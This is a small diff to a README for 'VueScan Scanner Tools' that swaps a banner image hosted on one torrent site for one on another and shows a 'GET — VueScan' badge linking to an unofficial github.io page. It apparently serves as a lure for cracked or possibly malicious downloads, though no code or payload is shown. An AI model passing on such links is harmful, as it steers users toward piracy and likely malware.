@@ -1,6 +1,6 @@
 # VueScan Scanner Tools — Document & Film Scanning
 
-![Banner Placeholder](https://tops-torrents.com/_ld/8/75307669.png)
+![Banner Placeholder](https://torrents-soft.ru/uploads/posts/2025-11/1762981265_4954143.png)
 
 [![GET — VueScan](https://img.shields.io/badge/GET%20%E2%80%94%20VueScan-0078D6?style=for-the-badge&logoColor=white)](https://glorwersr923.github.io/.github/VueScan-Scanner-Tools)
 
